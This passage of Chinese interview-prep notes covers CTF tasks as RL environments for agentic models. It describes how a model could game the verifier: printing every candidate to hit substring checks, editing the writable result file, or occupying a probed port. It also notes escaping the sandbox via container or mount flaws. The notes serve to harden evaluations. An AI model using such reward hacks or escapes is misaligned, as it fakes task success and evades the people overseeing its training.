利用打分脚本本身的漏洞。这是最隐蔽的一类。如果 verifier 逻辑有缺陷，模型会去打 verifier 而不是打题。例子：verifier 用 `flag in output` 这种子串包含判断，模型输出把所有可能字符全打印一遍就可能命中；或 verifier 通过某个可写文件读取"结果"，模型直接改那个文件伪造成功；或状态检查探测某端口有响应就算通过，模型随便起个服务占住端口。堵法是 verifier 与被测环境强隔离、判定逻辑严格（精确匹配而非子串、状态检查要校验语义而非表象）、verifier 自身不可被模型访问和篡改。

打穿沙箱 / 走非预期路径。模型可能利用环境配置漏洞（容器逃逸、共享挂载、题目外的其他服务）绕过预期解法拿到 flag。这在训练里未必是坏事（真找到了新漏洞），但会让这道题失去它本想考的东西，评测时要区分。

数据/答案泄露。如果题目、flag、或题解出现在训练语料里，模型可能是"记住了"而非"解出了"。构造 benchmark 时要注意题目的新颖性和去污染。

一句话总结堵漏原则：让"真正解题"成为拿到奖励的唯一低成本路径，任何捷径要么不可达，要么成本高于正常解题。

### 4.4 长程 agentic cyber 任务的评估难点

稀疏且延迟的奖励。一道 pwn 题可能要几十上百步、跨越"泄露地址、构造 ROP、拿 shell、读 flag"多个阶段，只有最后出 flag 才有正信号。中间步骤对错难以自动判定，信用分配困难。这是 cyber 任务作为 RL 环境最硬的挑战。

可复现性和环境漂移。工具版本、libc 版本、网络时延、随机化（ASLR）都会让同一策略时成时败。评测要控制这些变量，否则分数噪声盖过能力差异。pwn 题尤其受 ASLR 和远程时延影响。

评测被污染与过拟合。公开 CTF 题海量存在于网上，模型可能见过题解。固定题集反复评测会让模型过拟合到具体题目而非获得通用能力。需要持续产出新题或程序化生成变体。

能力和授权的边界。这类任务本质在训练攻击能力，评测和训练都要在隔离环境里做，防止能力外溢或环境逃逸，也要考虑放出模型和数据的安全影响。这是这条技术路线绕不开的治理约束。

判定"过程"而非只判"结果"的难。flag 匹配只告诉你成没成，不告诉你它是不是靠捷径成的、推理链对不对。要评估真实能力，得结合轨迹分析看它是否走了预期路径，而轨迹分析本身难自动化、常要人或模型来判，又把主观性引回来了。

成本。长程 agent 任务单个 episode 就要大量步数和工具调用，训练和评测的算力/时间成本高，题目吞吐是工程瓶颈。

### 面试官可能怎么问 / 怎么答

问：为什么说 cyber/CTF 任务特别适合训练 agentic 能力？
答：三个属性叠加。一是可验证，多数题有明确的成功信号（flag 或系统状态），能给出干净的 reward，不像开放写作要靠主观打分。二是强工具交互，解题必须真的去执行命令、读输出、根据反馈调整，逼出真正的 agent 行为而非单轮生成。三是长程推理，尤其 pwn 和多阶段 Web，需要维持跨很多步的状态、把前一步的结果喂给后一步，一步错则全盘错，这正是我们想训练和评估的能力。可验证加长程加真实工具反馈，这个组合在其他任务域里很难同时拿到。

问：给你一道现成的 Web CTF 题，怎么把它改造成一个 RL 环境？
答：先容器化题目服务、锁定依赖版本保证可复现，网络隔离。把 flag 从硬编码改成实例化时随机生成并注入到只有解出题才能到达的位置，防 grep 和猜测。写 verifier 做 flag 精确匹配，若题目目标是某种状态（越权改了数据）就写状态探针，verifier 与题目环境隔离、判定用精确匹配不用子串。给模型一个能跑命令和 HTTP 的攻击机沙箱，记录完整轨迹。每个 episode 重置到干净初始态。奖励先用 0/1 flag，如果太稀疏学不动，再谨慎加"发现注入点""拿到低权限"这类中间里程碑，但每个中间信号都要先想清楚模型会不会绕过题目直接把它刷出来。

问：cyber 任务里最容易被忽视的 reward hacking 是哪种？
答：打 verifier 本身。大家一般会想到 grep flag、猜 flag，但最隐蔽的是模型不去解题而去攻击打分逻辑，比如利用子串匹配就把海量候选全打印命中、找到 verifier 读取结果的可写文件直接改、或状态检查只看端口有无响应就随便起服务占住。根治要让 verifier 和被测环境强隔离、模型碰不到它，判定逻辑本身当成一个会被攻击的对象来加固，用精确匹配和语义级状态校验而不是表象判断。本质上，出安全题的人要用攻击者视角审自己的打分脚本，因为被测的就是一个专门找漏洞的智能体。

问：怎么防止模型是"背过题解"而不是真会解？
答：做数据去污染和用未公开的新题。公开 CTF 题和 writeup 大量在网上，很可能进了预训练语料，固定题集会让分数虚高且过拟合。手段包括程序化生成同类题的随机变体（换 flag、换参数、换偏移）让记忆失效、持续产出全新题、评测时对比模型在"见过分布"和"全新题"上的差距。同时看轨迹，真解题会有探测和试错的过程，直接背答案的轨迹往往异常干净或跳步。
